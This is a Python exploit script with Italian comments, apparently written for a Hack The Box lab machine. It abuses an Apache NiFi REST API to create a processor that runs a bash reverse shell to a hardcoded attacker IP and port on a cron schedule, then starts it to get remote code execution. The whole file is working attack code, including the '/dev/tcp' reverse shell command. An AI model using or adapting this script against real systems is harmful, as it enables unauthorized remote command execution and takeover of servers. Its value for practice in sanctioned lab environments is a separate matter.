import requests
import json
import sys

# Configurazione parametri forniti
target_url = "http://flow.helix.htb/nifi"
base_api_url = "http://helix.htb"
my_ip = "10.10.14.243"
my_port = "1234"

print(f"[*] Attaccando il target: {target_url}")
print(f"[*] Inviando la shell a: {my_ip}:{my_port}")

# 1. Recupera l'ID del Root Process Group (la whiteboard)
print("[*] Recupero il Root Process Group ID...")
try:
    r = requests.get(f"{base_api_url}/process-groups/root")
    if r.status_code != 200:
        print(f"[-] Impossibile connettersi alle API di NiFi (Status: {r.status_code}).")
        sys.exit(1)
    root_id = r.json()["id"]
    print(f"[+] Root ID trovato: {root_id}")
except Exception as e:
    print(f"[-] Errore di connessione: {e}")
    sys.exit(1)

# 2. Crea un ExecuteProcessor all'interno della whiteboard
print("[*] Creazione del processore malizioso sulla whiteboard...")
payload_create = {
    "revision": {"version": 0},
    "component": {
        "type": "org.apache.nifi.processors.standard.ExecuteProcessor",
        "name": "HTB_Exploit"
    }
}
r = requests.post(f"{base_api_url}/process-groups/{root_id}/processors", json=payload_create)
if r.status_code != 201:
    print(f"[-] Errore nella creazione del processore (Status: {r.status_code})")
    sys.exit(1)

processor = r.json()
proc_id = processor["id"]
version = processor["revision"]["version"]

# 3. Configura la Reverse Shell (CRON driven per evitare crash)
print("[*] Configurazione dei parametri di Reverse Shell...")
shell_cmd = f"bash -i >& /dev/tcp/{my_ip}/{my_port} 0>&1"
payload_config = {
    "id": proc_id,
    "revision": {"version": version},
    "component": {
        "id": proc_id,
        "config": {
            "schedulingStrategy": "CRON_DRIVEN",
            "schedulingPeriod": "* * * * * ?",
            "properties": {
                "Command": "bash",
                "Command Arguments": f"-c '{shell_cmd}'"
            }
        }
    }
}
r = requests.put(f"{base_api_url}/processors/{proc_id}", json=payload_config)
version = r.json()["revision"]["version"]

# 4. Avvia il processore per triggerare l'RCE
print("[*] Lancio del processore... Controlla il tuo listener Netcat!")
payload_start = {
    "id": proc_id,
    "revision": {"version": version},
    "component": {
        "id": proc_id,
        "state": "RUNNING"
    }
}
requests.put(f"{base_api_url}/processors/{proc_id}", json=payload_start)

print("[+] Richiesta inviata con successo!")
